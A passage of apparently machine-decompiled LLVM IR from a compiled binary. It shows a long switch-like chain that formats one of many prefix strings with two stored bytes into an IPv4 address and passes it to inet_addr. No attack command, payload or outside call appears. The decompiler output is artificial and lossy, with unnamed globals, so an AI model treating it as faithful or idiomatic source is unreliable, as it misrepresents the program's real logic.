  %v4_d0c8 = sext i8 %v3_d0b0 to i32
  %v6_d0c8 = sext i8 %v3_d0bc to i32
  %v8_d0c8 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([14 x i8]* @global_var_1bbac.408 to i32), i32 %v4_d0c8, i32 %v6_d0c8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d0cc

dec_label_pc_d0cc:                                ; preds = %dec_label_pc_d098, %dec_label_pc_d0a4
  %v7_d0d0 = icmp eq i32 %v2_ab54, 174
  br i1 %v7_d0d0, label %dec_label_pc_d0d8, label %dec_label_pc_d100

dec_label_pc_d0d8:                                ; preds = %dec_label_pc_d0cc
  %v3_d0e4 = load i8, i8* @global_var_265e5.82, align 1
  %v3_d0f0 = load i8, i8* @global_var_265e6.83, align 1
  %v4_d0fc = sext i8 %v3_d0e4 to i32
  %v6_d0fc = sext i8 %v3_d0f0 to i32
  %v8_d0fc = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1bbbc.410 to i32), i32 %v4_d0fc, i32 %v6_d0fc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d100

dec_label_pc_d100:                                ; preds = %dec_label_pc_d0cc, %dec_label_pc_d0d8
  %v7_d104 = icmp eq i32 %v2_ab54, 175
  br i1 %v7_d104, label %dec_label_pc_d10c, label %dec_label_pc_d134

dec_label_pc_d10c:                                ; preds = %dec_label_pc_d100
  %v3_d118 = load i8, i8* @global_var_265e5.82, align 1
  %v3_d124 = load i8, i8* @global_var_265e6.83, align 1
  %v4_d130 = sext i8 %v3_d118 to i32
  %v6_d130 = sext i8 %v3_d124 to i32
  %v8_d130 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([14 x i8]* @global_var_1bbcc.412 to i32), i32 %v4_d130, i32 %v6_d130, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d134

dec_label_pc_d134:                                ; preds = %dec_label_pc_d100, %dec_label_pc_d10c
  %v7_d138 = icmp eq i32 %v2_ab54, 176
  br i1 %v7_d138, label %dec_label_pc_d140, label %dec_label_pc_d168

dec_label_pc_d140:                                ; preds = %dec_label_pc_d134
  %v3_d14c = load i8, i8* @global_var_265e5.82, align 1
  %v3_d158 = load i8, i8* @global_var_265e6.83, align 1
  %v4_d164 = sext i8 %v3_d14c to i32
  %v6_d164 = sext i8 %v3_d158 to i32
  %v8_d164 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([14 x i8]* @global_var_1bbdc.414 to i32), i32 %v4_d164, i32 %v6_d164, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d168

dec_label_pc_d168:                                ; preds = %dec_label_pc_d134, %dec_label_pc_d140
  %v7_d16c = icmp eq i32 %v2_ab54, 177
  br i1 %v7_d16c, label %dec_label_pc_d174, label %dec_label_pc_d19c

dec_label_pc_d174:                                ; preds = %dec_label_pc_d168
  %v3_d180 = load i8, i8* @global_var_265e5.82, align 1
  %v3_d18c = load i8, i8* @global_var_265e6.83, align 1
  %v4_d198 = sext i8 %v3_d180 to i32
  %v6_d198 = sext i8 %v3_d18c to i32
  %v8_d198 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([14 x i8]* @global_var_1bbec.416 to i32), i32 %v4_d198, i32 %v6_d198, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d19c

dec_label_pc_d19c:                                ; preds = %dec_label_pc_d168, %dec_label_pc_d174
  %v7_d1a0 = icmp eq i32 %v2_ab54, 178
  br i1 %v7_d1a0, label %dec_label_pc_d1a8, label %dec_label_pc_d1d0

dec_label_pc_d1a8:                                ; preds = %dec_label_pc_d19c
  %v3_d1b4 = load i8, i8* @global_var_265e5.82, align 1
  %v3_d1c0 = load i8, i8* @global_var_265e6.83, align 1
  %v4_d1cc = sext i8 %v3_d1b4 to i32
  %v6_d1cc = sext i8 %v3_d1c0 to i32
  %v8_d1cc = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1bbfc.418 to i32), i32 %v4_d1cc, i32 %v6_d1cc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d1d0

dec_label_pc_d1d0:                                ; preds = %dec_label_pc_d19c, %dec_label_pc_d1a8
  %v7_d1d4 = icmp eq i32 %v2_ab54, 179
  br i1 %v7_d1d4, label %dec_label_pc_d1dc, label %dec_label_pc_d204

dec_label_pc_d1dc:                                ; preds = %dec_label_pc_d1d0
  %v3_d1e8 = load i8, i8* @global_var_265e5.82, align 1
  %v3_d1f4 = load i8, i8* @global_var_265e6.83, align 1
  %v4_d200 = sext i8 %v3_d1e8 to i32
  %v6_d200 = sext i8 %v3_d1f4 to i32
  %v8_d200 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1bc0c.420 to i32), i32 %v4_d200, i32 %v6_d200, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d204

dec_label_pc_d204:                                ; preds = %dec_label_pc_d1d0, %dec_label_pc_d1dc
  %v7_d208 = icmp eq i32 %v2_ab54, 180
  br i1 %v7_d208, label %dec_label_pc_d210, label %dec_label_pc_d238

dec_label_pc_d210:                                ; preds = %dec_label_pc_d204
  %v3_d21c = load i8, i8* @global_var_265e5.82, align 1
  %v3_d228 = load i8, i8* @global_var_265e6.83, align 1
  %v4_d234 = sext i8 %v3_d21c to i32
  %v6_d234 = sext i8 %v3_d228 to i32
  %v8_d234 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1bc1c.422 to i32), i32 %v4_d234, i32 %v6_d234, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d238

dec_label_pc_d238:                                ; preds = %dec_label_pc_d204, %dec_label_pc_d210
  %v7_d23c = icmp eq i32 %v2_ab54, 181
  br i1 %v7_d23c, label %dec_label_pc_d244, label %dec_label_pc_d26c

dec_label_pc_d244:                                ; preds = %dec_label_pc_d238
  %v3_d250 = load i8, i8* @global_var_265e5.82, align 1
  %v3_d25c = load i8, i8* @global_var_265e6.83, align 1
  %v4_d268 = sext i8 %v3_d250 to i32
  %v6_d268 = sext i8 %v3_d25c to i32
  %v8_d268 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1bc2c.424 to i32), i32 %v4_d268, i32 %v6_d268, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d26c

dec_label_pc_d26c:                                ; preds = %dec_label_pc_d238, %dec_label_pc_d244
  %v7_d270 = icmp eq i32 %v2_ab54, 182
  br i1 %v7_d270, label %dec_label_pc_d278, label %dec_label_pc_d2a0

dec_label_pc_d278:                                ; preds = %dec_label_pc_d26c
  %v3_d284 = load i8, i8* @global_var_265e5.82, align 1
  %v3_d290 = load i8, i8* @global_var_265e6.83, align 1
  %v4_d29c = sext i8 %v3_d284 to i32
  %v6_d29c = sext i8 %v3_d290 to i32
  %v8_d29c = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1bc3c.426 to i32), i32 %v4_d29c, i32 %v6_d29c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d2a0

dec_label_pc_d2a0:                                ; preds = %dec_label_pc_d26c, %dec_label_pc_d278
  %v7_d2a4 = icmp eq i32 %v2_ab54, 183
  br i1 %v7_d2a4, label %dec_label_pc_d2ac, label %dec_label_pc_d2d4

dec_label_pc_d2ac:                                ; preds = %dec_label_pc_d2a0
  %v3_d2b8 = load i8, i8* @global_var_265e5.82, align 1
  %v3_d2c4 = load i8, i8* @global_var_265e6.83, align 1
  %v4_d2d0 = sext i8 %v3_d2b8 to i32
  %v6_d2d0 = sext i8 %v3_d2c4 to i32
  %v8_d2d0 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b458.169 to i32), i32 %v4_d2d0, i32 %v6_d2d0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d2d4

dec_label_pc_d2d4:                                ; preds = %dec_label_pc_d2a0, %dec_label_pc_d2ac
  %v7_d2d8 = icmp eq i32 %v2_ab54, 184
  br i1 %v7_d2d8, label %dec_label_pc_d2e0, label %dec_label_pc_d308

dec_label_pc_d2e0:                                ; preds = %dec_label_pc_d2d4
  %v3_d2ec = load i8, i8* @global_var_265e5.82, align 1
  %v3_d2f8 = load i8, i8* @global_var_265e6.83, align 1
  %v4_d304 = sext i8 %v3_d2ec to i32
  %v6_d304 = sext i8 %v3_d2f8 to i32
  %v8_d304 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1bc4c.429 to i32), i32 %v4_d304, i32 %v6_d304, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d308

dec_label_pc_d308:                                ; preds = %dec_label_pc_d2d4, %dec_label_pc_d2e0
  %v7_d30c = icmp eq i32 %v2_ab54, 185
  br i1 %v7_d30c, label %dec_label_pc_d314, label %dec_label_pc_d33c

dec_label_pc_d314:                                ; preds = %dec_label_pc_d308
  %v3_d320 = load i8, i8* @global_var_265e5.82, align 1
  %v3_d32c = load i8, i8* @global_var_265e6.83, align 1
  %v4_d338 = sext i8 %v3_d320 to i32
  %v6_d338 = sext i8 %v3_d32c to i32
  %v8_d338 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1bc5c.431 to i32), i32 %v4_d338, i32 %v6_d338, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d33c

dec_label_pc_d33c:                                ; preds = %dec_label_pc_d308, %dec_label_pc_d314
  %v7_d340 = icmp eq i32 %v2_ab54, 186
  br i1 %v7_d340, label %dec_label_pc_d348, label %dec_label_pc_d370

dec_label_pc_d348:                                ; preds = %dec_label_pc_d33c
  %v3_d354 = load i8, i8* @global_var_265e5.82, align 1
  %v3_d360 = load i8, i8* @global_var_265e6.83, align 1
  %v4_d36c = sext i8 %v3_d354 to i32
  %v6_d36c = sext i8 %v3_d360 to i32
  %v8_d36c = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([14 x i8]* @global_var_1bc6c.433 to i32), i32 %v4_d36c, i32 %v6_d36c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d370

dec_label_pc_d370:                                ; preds = %dec_label_pc_d33c, %dec_label_pc_d348
  %v7_d374 = icmp eq i32 %v2_ab54, 187
  br i1 %v7_d374, label %dec_label_pc_d37c, label %dec_label_pc_d3a4

dec_label_pc_d37c:                                ; preds = %dec_label_pc_d370
  %v3_d388 = load i8, i8* @global_var_265e5.82, align 1
  %v3_d394 = load i8, i8* @global_var_265e6.83, align 1
  %v4_d3a0 = sext i8 %v3_d388 to i32
  %v6_d3a0 = sext i8 %v3_d394 to i32
  %v8_d3a0 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([14 x i8]* @global_var_1bc7c.435 to i32), i32 %v4_d3a0, i32 %v6_d3a0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d3a4

dec_label_pc_d3a4:                                ; preds = %dec_label_pc_d370, %dec_label_pc_d37c
  %v7_d3a8 = icmp eq i32 %v2_ab54, 188
  br i1 %v7_d3a8, label %dec_label_pc_d3b0, label %dec_label_pc_d3d8

dec_label_pc_d3b0:                                ; preds = %dec_label_pc_d3a4
  %v3_d3bc = load i8, i8* @global_var_265e5.82, align 1
  %v3_d3c8 = load i8, i8* @global_var_265e6.83, align 1
  %v4_d3d4 = sext i8 %v3_d3bc to i32
  %v6_d3d4 = sext i8 %v3_d3c8 to i32
  %v8_d3d4 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([14 x i8]* @global_var_1bc7c.435 to i32), i32 %v4_d3d4, i32 %v6_d3d4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d3d8

dec_label_pc_d3d8:                                ; preds = %dec_label_pc_d3a4, %dec_label_pc_d3b0
  %v7_d3dc = icmp eq i32 %v2_ab54, 189
  br i1 %v7_d3dc, label %dec_label_pc_d3e4, label %dec_label_pc_d40c

dec_label_pc_d3e4:                                ; preds = %dec_label_pc_d3d8
  %v3_d3f0 = load i8, i8* @global_var_265e5.82, align 1
  %v3_d3fc = load i8, i8* @global_var_265e6.83, align 1
  %v4_d408 = sext i8 %v3_d3f0 to i32
  %v6_d408 = sext i8 %v3_d3fc to i32
  %v8_d408 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([14 x i8]* @global_var_1bc8c.437 to i32), i32 %v4_d408, i32 %v6_d408, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d40c

dec_label_pc_d40c:                                ; preds = %dec_label_pc_d3d8, %dec_label_pc_d3e4
  %v7_d410 = icmp eq i32 %v2_ab54, 190
  br i1 %v7_d410, label %dec_label_pc_d418, label %dec_label_pc_d440

dec_label_pc_d418:                                ; preds = %dec_label_pc_d40c
  %v3_d424 = load i8, i8* @global_var_265e5.82, align 1
  %v3_d430 = load i8, i8* @global_var_265e6.83, align 1
  %v4_d43c = sext i8 %v3_d424 to i32
  %v6_d43c = sext i8 %v3_d430 to i32
  %v8_d43c = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([14 x i8]* @global_var_1bc9c.439 to i32), i32 %v4_d43c, i32 %v6_d43c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d440

dec_label_pc_d440:                                ; preds = %dec_label_pc_d40c, %dec_label_pc_d418
  %v7_d444 = icmp eq i32 %v2_ab54, 191
  br i1 %v7_d444, label %dec_label_pc_d44c, label %dec_label_pc_d474

dec_label_pc_d44c:                                ; preds = %dec_label_pc_d440
  %v3_d458 = load i8, i8* @global_var_265e5.82, align 1
  %v3_d464 = load i8, i8* @global_var_265e6.83, align 1
  %v4_d470 = sext i8 %v3_d458 to i32
  %v6_d470 = sext i8 %v3_d464 to i32
  %v8_d470 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([14 x i8]* @global_var_1bcac.441 to i32), i32 %v4_d470, i32 %v6_d470, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d474

dec_label_pc_d474:                                ; preds = %dec_label_pc_d440, %dec_label_pc_d44c
  %v7_d478 = icmp eq i32 %v2_ab54, 192
  br i1 %v7_d478, label %dec_label_pc_d480, label %dec_label_pc_d4a8

dec_label_pc_d480:                                ; preds = %dec_label_pc_d474
  %v3_d48c = load i8, i8* @global_var_265e5.82, align 1
  %v3_d498 = load i8, i8* @global_var_265e6.83, align 1
  %v4_d4a4 = sext i8 %v3_d48c to i32
  %v6_d4a4 = sext i8 %v3_d498 to i32
  %v8_d4a4 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1bcbc.443 to i32), i32 %v4_d4a4, i32 %v6_d4a4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d4a8

dec_label_pc_d4a8:                                ; preds = %dec_label_pc_d474, %dec_label_pc_d480
  %v7_d4ac = icmp eq i32 %v2_ab54, 193
  br i1 %v7_d4ac, label %dec_label_pc_d4b4, label %dec_label_pc_d4dc

dec_label_pc_d4b4:                                ; preds = %dec_label_pc_d4a8
  %v3_d4c0 = load i8, i8* @global_var_265e5.82, align 1
  %v3_d4cc = load i8, i8* @global_var_265e6.83, align 1
  %v4_d4d8 = sext i8 %v3_d4c0 to i32
  %v6_d4d8 = sext i8 %v3_d4cc to i32
  %v8_d4d8 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1bccc.445 to i32), i32 %v4_d4d8, i32 %v6_d4d8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d4dc

dec_label_pc_d4dc:                                ; preds = %dec_label_pc_d4a8, %dec_label_pc_d4b4
  %v7_d4e0 = icmp eq i32 %v2_ab54, 194
  br i1 %v7_d4e0, label %dec_label_pc_d4e8, label %dec_label_pc_d510

dec_label_pc_d4e8:                                ; preds = %dec_label_pc_d4dc
  %v3_d4f4 = load i8, i8* @global_var_265e5.82, align 1
  %v3_d500 = load i8, i8* @global_var_265e6.83, align 1
  %v4_d50c = sext i8 %v3_d4f4 to i32
  %v6_d50c = sext i8 %v3_d500 to i32
  %v8_d50c = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([14 x i8]* @global_var_1bcdc.447 to i32), i32 %v4_d50c, i32 %v6_d50c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d510

dec_label_pc_d510:                                ; preds = %dec_label_pc_d4dc, %dec_label_pc_d4e8
  %v7_d514 = icmp eq i32 %v2_ab54, 195
  br i1 %v7_d514, label %dec_label_pc_d51c, label %dec_label_pc_d544

dec_label_pc_d51c:                                ; preds = %dec_label_pc_d510
  %v3_d528 = load i8, i8* @global_var_265e5.82, align 1
  %v3_d534 = load i8, i8* @global_var_265e6.83, align 1
  %v4_d540 = sext i8 %v3_d528 to i32
  %v6_d540 = sext i8 %v3_d534 to i32
  %v8_d540 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([17 x i8]* @global_var_1bcec.449 to i32), i32 %v4_d540, i32 %v6_d540, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d544

dec_label_pc_d544:                                ; preds = %dec_label_pc_d510, %dec_label_pc_d51c
  %v7_d548 = icmp eq i32 %v2_ab54, 196
  br i1 %v7_d548, label %dec_label_pc_d550, label %dec_label_pc_d578

dec_label_pc_d550:                                ; preds = %dec_label_pc_d544
  %v3_d55c = load i8, i8* @global_var_265e5.82, align 1
  %v3_d568 = load i8, i8* @global_var_265e6.83, align 1
  %v4_d574 = sext i8 %v3_d55c to i32
  %v6_d574 = sext i8 %v3_d568 to i32
  %v8_d574 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([16 x i8]* @global_var_1bd00.451 to i32), i32 %v4_d574, i32 %v6_d574, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d578

dec_label_pc_d578:                                ; preds = %dec_label_pc_d544, %dec_label_pc_d550
  %v7_d57c = icmp eq i32 %v2_ab54, 197
  br i1 %v7_d57c, label %dec_label_pc_d584, label %dec_label_pc_d5ac

dec_label_pc_d584:                                ; preds = %dec_label_pc_d578
  %v3_d590 = load i8, i8* @global_var_265e5.82, align 1
  %v3_d59c = load i8, i8* @global_var_265e6.83, align 1
  %v4_d5a8 = sext i8 %v3_d590 to i32
  %v6_d5a8 = sext i8 %v3_d59c to i32
  %v8_d5a8 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([15 x i8]* @global_var_1b8d4.314 to i32), i32 %v4_d5a8, i32 %v6_d5a8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d5ac

dec_label_pc_d5ac:                                ; preds = %dec_label_pc_d578, %dec_label_pc_d584
  %v7_d5b0 = icmp eq i32 %v2_ab54, 198
  br i1 %v7_d5b0, label %dec_label_pc_d5b8, label %dec_label_pc_d5e0

dec_label_pc_d5b8:                                ; preds = %dec_label_pc_d5ac
  %v3_d5c4 = load i8, i8* @global_var_265e5.82, align 1
  %v3_d5d0 = load i8, i8* @global_var_265e6.83, align 1
  %v4_d5dc = sext i8 %v3_d5c4 to i32
  %v6_d5dc = sext i8 %v3_d5d0 to i32
  %v8_d5dc = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([15 x i8]* @global_var_1bd10.454 to i32), i32 %v4_d5dc, i32 %v6_d5dc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d5e0

dec_label_pc_d5e0:                                ; preds = %dec_label_pc_d5ac, %dec_label_pc_d5b8
  %v7_d5e4 = icmp eq i32 %v2_ab54, 199
  br i1 %v7_d5e4, label %dec_label_pc_d5ec, label %dec_label_pc_d614

dec_label_pc_d5ec:                                ; preds = %dec_label_pc_d5e0
  %v3_d5f8 = load i8, i8* @global_var_265e5.82, align 1
  %v3_d604 = load i8, i8* @global_var_265e6.83, align 1
  %v4_d610 = sext i8 %v3_d5f8 to i32
  %v6_d610 = sext i8 %v3_d604 to i32
  %v8_d610 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([15 x i8]* @global_var_1bd20.456 to i32), i32 %v4_d610, i32 %v6_d610, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d614

dec_label_pc_d614:                                ; preds = %dec_label_pc_d5e0, %dec_label_pc_d5ec
  %v7_d618 = icmp eq i32 %v2_ab54, 200
  br i1 %v7_d618, label %dec_label_pc_d620, label %dec_label_pc_d648

dec_label_pc_d620:                                ; preds = %dec_label_pc_d614
  %v3_d62c = load i8, i8* @global_var_265e5.82, align 1
  %v3_d638 = load i8, i8* @global_var_265e6.83, align 1
  %v4_d644 = sext i8 %v3_d62c to i32
  %v6_d644 = sext i8 %v3_d638 to i32
  %v8_d644 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([15 x i8]* @global_var_1bd30.458 to i32), i32 %v4_d644, i32 %v6_d644, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d648

dec_label_pc_d648:                                ; preds = %dec_label_pc_d614, %dec_label_pc_d620
  %v7_d64c = icmp eq i32 %v2_ab54, 201
  br i1 %v7_d64c, label %dec_label_pc_d688, label %dec_label_pc_d67c

dec_label_pc_d67c:                                ; preds = %dec_label_pc_d648
  br label %dec_label_pc_d6b0

dec_label_pc_d688:                                ; preds = %dec_label_pc_d648
  %v3_d660 = load i8, i8* @global_var_265e5.82, align 1
  %v3_d66c = load i8, i8* @global_var_265e6.83, align 1
  %v4_d678 = sext i8 %v3_d660 to i32
  %v6_d678 = sext i8 %v3_d66c to i32
  %v8_d678 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([15 x i8]* @global_var_1bd40.460 to i32), i32 %v4_d678, i32 %v6_d678, i32 ptrtoint (i32* @0 to i32))
  %v3_d694 = load i8, i8* @global_var_265e5.82, align 1
  %v3_d6a0 = load i8, i8* @global_var_265e6.83, align 1
  %v4_d6ac = sext i8 %v3_d694 to i32
  %v6_d6ac = sext i8 %v3_d6a0 to i32
  %v8_d6ac = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1bd50.462 to i32), i32 %v4_d6ac, i32 %v6_d6ac, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d6b0

dec_label_pc_d6b0:                                ; preds = %dec_label_pc_d67c, %dec_label_pc_d688
  %v7_d6b4 = icmp eq i32 %v2_ab54, 202
  br i1 %v7_d6b4, label %dec_label_pc_d6bc, label %dec_label_pc_d6e4

dec_label_pc_d6bc:                                ; preds = %dec_label_pc_d6b0
  %v3_d6c8 = load i8, i8* @global_var_265e5.82, align 1
  %v3_d6d4 = load i8, i8* @global_var_265e6.83, align 1
  %v4_d6e0 = sext i8 %v3_d6c8 to i32
  %v6_d6e0 = sext i8 %v3_d6d4 to i32
  %v8_d6e0 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([14 x i8]* @global_var_1b388.139 to i32), i32 %v4_d6e0, i32 %v6_d6e0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d6e4

dec_label_pc_d6e4:                                ; preds = %dec_label_pc_d6b0, %dec_label_pc_d6bc
  %v7_d6e8 = icmp eq i32 %v2_ab54, 203
  br i1 %v7_d6e8, label %dec_label_pc_d6f0, label %dec_label_pc_d718

dec_label_pc_d6f0:                                ; preds = %dec_label_pc_d6e4
  %v3_d6fc = load i8, i8* @global_var_265e5.82, align 1
  %v3_d708 = load i8, i8* @global_var_265e6.83, align 1
  %v4_d714 = sext i8 %v3_d6fc to i32
  %v6_d714 = sext i8 %v3_d708 to i32
  %v8_d714 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1bd60.465 to i32), i32 %v4_d714, i32 %v6_d714, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d718

dec_label_pc_d718:                                ; preds = %dec_label_pc_d6e4, %dec_label_pc_d6f0
  %v7_d71c = icmp eq i32 %v2_ab54, 204
  br i1 %v7_d71c, label %dec_label_pc_d724, label %dec_label_pc_d74c

dec_label_pc_d724:                                ; preds = %dec_label_pc_d718
  %v3_d730 = load i8, i8* @global_var_265e5.82, align 1
  %v3_d73c = load i8, i8* @global_var_265e6.83, align 1
  %v4_d748 = sext i8 %v3_d730 to i32
  %v6_d748 = sext i8 %v3_d73c to i32
  %v8_d748 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1bd70.467 to i32), i32 %v4_d748, i32 %v6_d748, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d74c

dec_label_pc_d74c:                                ; preds = %dec_label_pc_d718, %dec_label_pc_d724
  %v7_d750 = icmp eq i32 %v2_ab54, 205
  br i1 %v7_d750, label %dec_label_pc_d758, label %dec_label_pc_d780

dec_label_pc_d758:                                ; preds = %dec_label_pc_d74c
  %v3_d764 = load i8, i8* @global_var_265e5.82, align 1
  %v3_d770 = load i8, i8* @global_var_265e6.83, align 1
  %v4_d77c = sext i8 %v3_d764 to i32
  %v6_d77c = sext i8 %v3_d770 to i32
  %v8_d77c = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1bd80.469 to i32), i32 %v4_d77c, i32 %v6_d77c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d780

dec_label_pc_d780:                                ; preds = %dec_label_pc_d74c, %dec_label_pc_d758
  %v7_d784 = icmp eq i32 %v2_ab54, 206
  br i1 %v7_d784, label %dec_label_pc_d78c, label %dec_label_pc_d7b4

dec_label_pc_d78c:                                ; preds = %dec_label_pc_d780
  %v3_d798 = load i8, i8* @global_var_265e5.82, align 1
  %v3_d7a4 = load i8, i8* @global_var_265e6.83, align 1
  %v4_d7b0 = sext i8 %v3_d798 to i32
  %v6_d7b0 = sext i8 %v3_d7a4 to i32
  %v8_d7b0 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1bd90.471 to i32), i32 %v4_d7b0, i32 %v6_d7b0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d7b4

dec_label_pc_d7b4:                                ; preds = %dec_label_pc_d780, %dec_label_pc_d78c
  %v7_d7b8 = icmp eq i32 %v2_ab54, 207
  br i1 %v7_d7b8, label %dec_label_pc_d7c0, label %dec_label_pc_d7e8

dec_label_pc_d7c0:                                ; preds = %dec_label_pc_d7b4
  %v3_d7cc = load i8, i8* @global_var_265e5.82, align 1
  %v3_d7d8 = load i8, i8* @global_var_265e6.83, align 1
  %v4_d7e4 = sext i8 %v3_d7cc to i32
  %v6_d7e4 = sext i8 %v3_d7d8 to i32
  %v8_d7e4 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([14 x i8]* @global_var_1bda0.473 to i32), i32 %v4_d7e4, i32 %v6_d7e4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d7e8

dec_label_pc_d7e8:                                ; preds = %dec_label_pc_d7b4, %dec_label_pc_d7c0
  store i32 %v2_aa80, i32* @r0, align 4
  %v1_d824 = call i32 @inet_addr(i32 %v2_aa80)
  store i32 %v3_aa78, i32* @fp, align 4
  ret i32 %v1_d824

; uselistorder directives
  uselistorder i32 %v2_aa80, { 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 0, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 ptrtoint ([14 x i8]* @global_var_1bc7c.435 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([14 x i8]* @global_var_1bafc.385 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([14 x i8]* @global_var_1ba90.370 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([14 x i8]* @global_var_1b900.320 to i32), { 2, 1, 0 }
  uselistorder i32 ptrtoint ([15 x i8]* @global_var_1b8d4.314 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([14 x i8]* @global_var_1b874.302 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([15 x i8]* @global_var_1b814.290 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([14 x i8]* @global_var_1b628.227 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([14 x i8]* @global_var_1b618.225 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([13 x i8]* @global_var_1b478.173 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([13 x i8]* @global_var_1b458.169 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([13 x i8]* @global_var_1b448.167 to i32), { 2, 1, 0 }
